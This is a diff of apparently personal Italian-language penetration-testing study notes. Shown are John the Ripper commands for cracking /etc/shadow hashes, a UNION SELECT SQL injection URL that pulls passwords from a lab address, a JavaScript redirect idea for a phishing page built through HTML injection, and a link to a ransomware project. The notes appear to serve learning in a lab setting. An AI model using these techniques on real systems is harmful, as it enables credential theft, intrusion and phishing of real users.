@@ -378,6 +378,7 @@ PER /etc/shadow
 john --format=crypt --wordlist=w.txt 
 john --show hashes.txt 
 
+dopo brute force ssh se entriamo su una macchina come sistemisti possiamo fare "privilege escalation" con il password-cracking con john the ripper sul file /etc/shaodw che avrà permessi anche per others. 
 
 
 -- tunnel ssh:                  (RIVEDERE)
@@ -422,7 +423,11 @@ http://172.17.0.8/classifica.php?search=0%27%20UNION%20SELECT%20password%20,%20n
 
 
 html injection + phishing sito invest
-descrizione + immagine
+descrizione + 
+
+farming :
+sleep(3s) ....
+window.location.href="link-pagina" su javascript                    -- DA VEDERE
 
 https://github.com/tarcisio-marinho/GonnaCry/tree/master
 
